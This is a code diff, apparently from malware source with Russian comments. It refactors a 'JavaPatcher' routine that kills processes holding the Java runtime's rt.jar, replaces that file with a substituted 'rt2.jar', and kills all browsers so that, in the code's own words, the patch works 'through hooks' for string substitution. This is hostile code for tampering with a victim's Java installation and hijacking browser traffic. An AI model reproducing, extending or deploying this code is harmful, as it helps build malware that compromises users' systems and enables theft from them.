@@ -690,7 +690,7 @@ static void GetFileName(HANDLE hFile, PCHAR TheName)
 
  
 
-static int FindBlockingProcesses( char* FileName, ULONG** PIDs )
+static int FindBlockingProcesses( char* FileName, ULONG* PIDs, int c_PIDs )
 {
 	PSYSTEM_HANDLE_INFORMATION Info;
 	ULONG                      r;
@@ -724,9 +724,9 @@ static int FindBlockingProcesses( char* FileName, ULONG** PIDs )
 						//DBG( "JavaPatcher", "File busy %s", Name );
 						if( Name[0] != 0 && m_strstr( Name, FileName ) != NULL )
 						{
-							*PIDs = (ULONG*)MemRealloc( *PIDs, (procCount + 1) * sizeof(ULONG) );
-							(*PIDs)[procCount] = Info->aSH[r].uIdProcess;
+							PIDs[procCount] = Info->aSH[r].uIdProcess;
 							procCount++;
+							if( procCount >= c_PIDs ) break;
 						}
 						pCloseHandle(hFile);
 					}
@@ -739,6 +739,23 @@ static int FindBlockingProcesses( char* FileName, ULONG** PIDs )
 	return procCount;
 }
 
+//уничтожает процессы которые держат указанный файл
+static void KillBlockingProcesses( const char* fileName )
+{
+	ULONG PIDS[10];
+
+	int counter = 0; //счетчик попыток уничтожения процессов
+	int countProcess;
+	while( ( countProcess = FindBlockingProcesses( "\\lib\\rt.jar", PIDS, 10 ) ) && counter < 3 )
+	{
+		counter++;
+		while( countProcess-- )
+		{
+			DBG( "JavaPatcher",  "Killing process %d", PIDS[countProcess] );
+			KillProcess( PIDS[countProcess], 1000 );
+		};
+	};	
+}
 
 ///////////////////////////////////////////////////////////////////////////////
 HHOOK hMsgBoxHook;
@@ -975,22 +992,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 			pPathAppendA( srcFile, "rt2.jar" );
 			pPathAppendA( dstFile, "rt.jar" );
 						
-			ULONG *PIDS = NULL;
-
-			int counter = 0; //счетчик попыток уничтожения процессов
-			int countProcess;
-			while( ( countProcess = FindBlockingProcesses( "\\lib\\rt.jar", &PIDS ) ) && counter < 3 )
-			{
-				counter++;
-				while( countProcess-- )
-				{
-					DBG( "JavaPatcher",  "Killing process %d", PIDS[countProcess] );
-					KillProcess( PIDS[countProcess], 1000 );
-				};
-				MemFree(PIDS);
-				PIDS = 0;
-			};	
-					
+			KillBlockingProcesses("\\lib\\rt.jar");
 			KillAllBrowsers();
 
 			if( pCopyFileA( srcFile, dstFile, FALSE ) ) 
@@ -1029,6 +1031,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 			//сообщаем что патч не установился
 			GetWorkFolder( path.str(), "PatchFail.txt" );
 			File::WriteBufferA( path.str(), &buf, 1 );
+			KillBlockingProcesses("\\lib\\rt.jar"); //уничтожаем процессы для которых нужно проводить подмену строк
 			KillAllBrowsers(); //уничтожаем все браузеры, чтобы патч работал через хуки
 		}
 	}
